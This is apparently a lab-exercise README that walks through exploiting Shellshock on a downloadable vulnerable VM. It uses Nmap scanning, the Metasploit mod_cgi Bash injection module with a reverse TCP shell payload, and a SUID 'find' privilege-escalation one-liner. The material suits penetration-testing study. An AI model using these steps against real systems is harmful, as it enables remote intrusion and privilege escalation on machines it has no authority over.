# Shellshock

This repository describes how to exploit the Bash Shellshock vulnerability. 

## Topics
- [Background](#background)
- [Use Case](#use-case)
- [Prerequisites](#prerequisites)
- [Usage](#usage)
  - [Scan the Network](#scan-the-network)
  - [Attack the Program](#attack-the-program)
  - [Create a Reverse Shell](#create-a-reverse-shell)
  - [Escalate Privileges](#escalate-privileges)
- [Resources](#resources)

## Background

Shellshock is a GNU Bash vulnerability that was discovered in 2014. The Shellshock vulnerabililty can affect numerous systems and attack vectors. GNU Bash through version 4.3 processes trailing strings after function definitions in environment variable values. This allows attackers to execute arbitrary code by using those external variables. The Shellshock vulnerability affects multiple vectors including the mod_cgi and mod_cgid methods of the Apache HTTP server that display dynamic content on web pages and applications. The Shellshock exploit can be launched either remotely or from a local machine.

## Use Case

The Shellshock vulnerability should only be exploited in a research environment. Running the Shellshock exploit enables researches to become better acquainted with common vulnerabilities that should be remediated. Exploiting the Shellshock vulnerability in a research environment can help users become acquainted with penetration testing tools and methods.

## Prerequisites

Shellshock exploitation requires a vulnerable machine. A vulnerable Shellshock virtual machine called `shellshock_server.ova` can be [downloaded here](https://gtvault-my.sharepoint.com/:u:/g/personal/rheavican3_gatech_edu/EVihwYFaVDlChicYIgfXPHIBMLW_kOUUO8sTaJ7b8JLw2A?e=jIvhZ6). The password for `shellshock_server.ova` is `77t*#bT8sd`. The `shellshock_server.ova` virtual machine should be run in hypervisor that runs Open Virtualization Format files, such as VirtualBox.

An instance of Kali linux is required to exploit the vulnerable `shellshock_server.ova` virtual machine. The latest Kali image can be downloaded at the [official Kali download page](https://www.kali.org/get-kali/). The Kali virtual machine should be deployed on the same virtual network as `shellshock_server.ova`. 

## Usage

Perform the following tasks to exploit the Shellshock vulnerability in `shellshock_server.ova`:

### Scan the Network

The IP address of the vulnerable virtual machine must be identified to exploit the Shellshock vulnerability. Use `ifconfig -a` in a Kali terminal to identify the virtual network.

Scan the virtual network to identify the vulnerable server. Kali linux includes the Nmap open-source network discovery tool. Run the following command in a Kali terminal to scan the virtual network for hosts: Replace `$Subnet` with the network acquired through `ifconfig -a`.

```
nmap scan $Subnet
```

Run the following command in a Kali terminal to identify all open ports of the vulnerable host. Replace `$IPAddress` with the host IP address found in the previous Nmap scan:

```
nmap -p- $IPAddress
```

Use CURL to connect to any open HTTP ports identified by Nmap to determine if they are vulnerable to Shellshock. Replace `$IPAddress` and `$Port` with the IP address and open HTTP port identified by Nmap:

```
curl http:// <$IPAddress>:<$Port>/cgi-bin/shellshock.cgi
```

The server is vulnerable to Shellshock if the content of the URL is returned in the terminal. The returned URL will be used to attack the vulnerable CGI program.

### Attack the Program

Use the Metasploit framework included in Kali to exploit the vulnerable Shellshock server identifed using Nmap. Type `msfconsole` in a Kali terminal to launch the Metasploit framework.

Metasploit's primary components consist of exploit modules and exploit payloads. Metasploit modules are written to exploit specific vulnerabilities. Metasploit payloads are the packets that are sent within the exploit. 

Use the Apache mod_cgi Bash Environment Variable Code Injection Metasploit module to exploit the vulnerable server identified in Nmap. This module sets the `HTTP_User_Agent` environment variable to a malicious function definition to exploit the mod_cgi script on the Apache web server. Run the following commands in metasploit to run the module:

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Specify the remote host to be exploited in the Metasploit module by running the following command. Replace `#IPAddress` with the IP address of the vulnerable server identified using Nmap.

```
set rhost #IPAddress
```

Specify the URL of the vulnerable target CGI program with the following command:

```
set targeturi /cgi-bin/shellshock.cgi
```

### Create a Reverse Shell

Now the payload needs to be used to exploit the vulnerable Shellshock server. Use `show payloads` to show the possible payloads for the current mod_cgi bash injnection module. Use the `linux/x86/shell/reverse_tcp` reverse shell exploit by running the following commands:

```
set payload linux/x86/shell/reverse_tcp
check
exploit
```

This will create a reverse shell session on the vulnerable server. 

### Escalate Privileges

The `shellshock_server.ova` virtual machine is vulnerable to privilege escalation in addition to its Shellshock vulnerability. Use `/bin/bash -i` to create an interactive Bash session on the reverse shell session. Then use the `whoami` command to identify the user account running the reverse shell session. `whoami` will show the user running the reverse shell as `www-data`.

Navigate to `/usr/bin` and run `ls -la` to identify any programs that use permissions for users other than `www-data`. `ls -la` will show that the `find` program has user privileges for the user `shellshock_server`. Launch a Bash session with the privileges of the `shellshock_server` user by running the following command:

```
find /usr/bin/ -name find -exec /bin/bash -ip \;
```

Use the `whoami` command to confirm that privileges for the Bash session have been escalated to the user `shellshock_server`

## Resources
- [Shellshock CVE](https://nvd.nist.gov/vuln/detail/cve-2014-6271)
- [Shellshock Exploitation](https://www.infosecarticles.com/exploiting-shellshock-vulnerability/)
- [Metasploit Shellshock Exploitation](https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/)
- [Metasploit Exploit for Apache mod_cgi Bash Environment Variable Code Injection](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/)
- [Shell Spawning](https://rcenetsec.com/shell-spawning/)
- [Privilege Escalation](https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/)
